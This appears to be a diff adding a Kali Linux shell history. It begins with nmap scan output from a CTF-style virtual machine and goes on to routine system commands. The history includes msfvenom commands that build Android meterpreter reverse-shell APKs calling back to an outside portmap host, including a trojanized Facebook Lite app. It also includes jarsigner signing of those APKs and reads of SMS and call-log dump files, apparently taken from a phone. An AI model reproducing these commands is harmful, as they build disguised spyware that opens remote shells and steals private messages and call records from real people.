+  345  ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  346  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  347  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  348  |     Let's see how good you are with simple maths
+  349  |     Answer my questions 1000 times and I'll give you your gift.
+  350  |     '*', 1)
+  351  |   RPCCheck: 
+  352  |     ____ _____ _ 
+  353  |     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  354  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  355  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  356  |     Let's see how good you are with simple maths
+  357  |     Answer my questions 1000 times and I'll give you your gift.
+  358  |_    '+', 9)
+  359  7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
+  360  |_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
+  361  |_http-title: Lost in space
+  362  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+  363  SF-Port1337-TCP:V=7.80%I=7%D=12/22%Time=5DFF52E4%P=x86_64-pc-linux-gnu%r(N
+  364  SF:ULL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  365  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x2
+  366  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__
+  367  SF:\x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x2
+  368  SF:0__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_
+  369  SF:\x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\
+  370  SF:x20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|
+  371  SF:\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20
+  372  SF:\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|
+  373  SF:\x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\
+  374  SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  375  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+  376  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  377  SF:\n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20math
+  378  SF:s\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x2
+  379  SF:0you\x20your\x20gift\.\n\(6,\x20'\*',\x201\)\n>\x20")%r(RPCCheck,1BC,"\
+  380  SF:x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  381  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\
+  382  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_
+  383  SF:\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___
+  384  SF:\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_
+  385  SF:\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\
+  386  SF:x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20
+  387  SF:\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x
+  388  SF:20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\
+  389  SF:\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\
+  390  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  391  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+  392  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\
+  393  SF:x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\
+  394  SF:x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20yo
+  395  SF:ur\x20gift\.\n\(1,\x20'\+',\x209\)\n>\x20");
+  396  MAC Address: 08:00:27:31:31:DB (Oracle VirtualBox virtual NIC)
+  397  Device type: general purpose
+  398  Running: Linux 3.X|4.X
+  399  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+  400  OS details: Linux 3.2 - 4.9
+  401  Network Distance: 1 hop
+  402  Service Info: OS: Unix
+  403  kwrite /etc/resolv.conf 
+  404  kwrite /etc/hosts
+  405  http://192.168.0.129/
+  406  kwrite /etc/hosts
+  407  echo _alid_=zraQfkPoYJjCI/lYmtTlsw==
+  408  echo _alid_=zraQfkPoYJjCI/lYmtTlsw== | ascii
+  409  poweroff 
+  410  apt update
+  411  apt upgrade -y
+  412  poweroff 
+  413  history >> cmd_3.txt 
+  414  apt upgrade -y
+  415  kwrite /etc/
+  416  ls /etc/apt/sources.list
+  417  kwrite /etc/apt/sources.list
+  418  apt upgrade -y
+  419  kwrite /etc/apt/sources.list
+  420  apt upgrade -y
+  421  kwrite /etc/apt/sources.list
+  422  apt upgrade -y
+  423  kwrite /etc/apt/sources.list
+  424  apt upgrade -y
+  425  poweroff 
+  426  ping google.com
+  427  ping google.com
+  428  apt upgrade -y
+  429  poweroff 
+  430  exit
+  431  ping google.com
+  432  exit
+  433  exit
+  434  poweroff 
+  435  ./v.exe 
+  436  history 
+  437  history >>cmd.txt
+  438  g
+  439  gcc help
+  440  gcc --help
+  441  gcc FACTORIA.CPP 
+  442  gcc FACTORIA.CPP a
+  443  gcc FACTORIA.CPP a.out
+  444  gcc FACTORIA.CPP -w a.out
+  445  gcc FACTORIA.CPP -w /root/
+  446  gcc FACTORIA.CPP -w /root/Desktop/install/program/a.out
+  447  gcc FACTORIA.CPP -w /root/Desktop/install/program/
+  448  gcc FACTORIA.CPP -w /root/Desktop/install/program/v.exe
+  449  gcc FACTORIA.CPP  /root/Desktop/install/program/v.exe
+  450  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  451  gcc FACTORIA.CPP -o /root/Desktop/v.exe
+  452  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  453  gcc FACTORIA.CPP -o test
+  454  ./test
+  455  sudo gcc –o first FACTORIA.CPP 
+  456  sudo gcc FACTORIA.CPP –o first 
+  457  sudo gcc FACTORIA.CPP
+  458  sudo gcc FACTORIA.CPP –O first 
+  459  sudo gcc FACTORIA.CPP -o first 
+  460  ls
+  461  msfconsole 
+  462  pwd
+  463  apt-get install openvpn
+  464  ifconfig
+  465  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test1.apk
+  466  ls
+  467  pwd
+  468  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test2.apk
+  469  ls
+  470  cd /
+  471  ls
+  472  cd usr/
+  473  ls
+  474  cd..
+  475  cd ..
+  476  ls
+  477  cd var
+  478  ls
+  479  losf
+  480  apt-get install lsof
+  481  lsof -t -i:1234
+  482  lsof -n | grep tcp  | grep LISTEN | grep 1234
+  483  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  484  kali `lsof -t -i:1234
+  485  kali `lsof -t -i:1234`
+  486  kill `lsof -t -i:1234`
+  487  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  488  kali `lsof -t -i:1234`
+  489  kill `lsof -t -i:1234`
+  490  lsof -t -i:1234
+  491  kill 3145
+  492  lsof -t -i:1234
+  493  opnvpn Vijay_2045.Hack.ovpn 
+  494  openvpn Vijay_2045.Hack.ovpn
+  495  l
+  496  ls
+  497  cd /
+  498  ls
+  499  cd root
+  500  ls
+  501  cat sms_dump_20191229201913.txt 
+  502  ls
+  503  cat calllog_dump_20191229202017.txt 
+  504  apktool
+  505  apt-get install apk-tool
+  506  apt-get install apktool
+  507  apktool
+  508  openvpn Vijay_2045.Hack.ovpn
+  509  ifconfig
+  510  msfvenom -p  android/meterpreter/reverse_tcp lhost = 192.168.43.164 lport = 4321
+  511  msfvenom -p  android/meterpreter/reverse_tcp lhost=192.168.43.164 lport=4321 -o lo_t1.apk
+  512  openvpn Vijay_2045.Hack.ovpn
+  513  ifconfig
+  514  msfvenom -x /root/Desktop/install/kill/Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o M_facebook.apk
+  515  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk 
+  516  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -f -o test
+  517  poweroff
+  518  keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+  519  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore (application_name).apk alias_name
+  520  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  521  apt-get install jarsigner
+  522  jarsigner
+  523  apt-get install java
+  524  apt-get install open-jdk
+  525  sudo apt-get install openjdk-11-jdk
+  526  sudo apt-get install openjdk-11-jdk -y
+  527  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  528  history >>cmd.txt
+  529  ls
+  530  pwd
+  531  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  532  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test2.apk alias_name
+  533  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore test2.apk alias_name
+  534  history >>cmd.txt
+  535  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore lo_t1.apk alias_name
+  536  ping google.com
+  537  kwrite /etc/resolv.conf 
+  538  ping google.com
+  539  echo >>/dev/null 
+  540  echo nameserver 8.8.8.8>>/etc/resolv.conf 
+  541  echo nameserver 8.8.4.4>>/etc/resolv.conf 
+  542  echo nameserver 1.1.1.1>>/etc/resolv.conf 
+  543  rfkill unblock wifi
+  544  kwrite /etc/hosts
+  545  ping google.com
+  546  kwrite /etc/hosts.allow 
+  547  kwrite /etc/hosts.deny 
+  548  ifconfig
+  549  ping 192.168.43.164
+  550  ping 192.168.43.1
+  551  ping 8.8.8.8
+  552  cat /etc/resolv.conf 
+  553  kwrite /etc/resolv.conf 
+  554  ping 8.8.8.8
+  555  ping google.com
+  556  kwrite /etc/network/interfaces
+  557  echo "nameserver 8.8.8.8" > /dev/null
+  558  ping google.co
+  559  ping google.com
+  560  kwrite /etc/network/interfaces
+  561  ping google.com
+  562  apt-get update 
+  563  apt-get upgrade -y
+  564  kwrite /etc/network/interfaces
+  565  kwrite /etc/network/ssh_and_dns_start
+  566  kwrite /etc/network/interfaces
+  567  service network-manager restart 
+  568  echo "nameserver 8.8.8.8" > /dev/null
+  569  service network-manager restart 
+  570  cat /etc/resolv.conf 
+  571  echo nameserver 1.1.1.1>>/etc/resolv.conf 
+  572  cat /etc/resolv.conf 
+  573  history >>cmd.txt
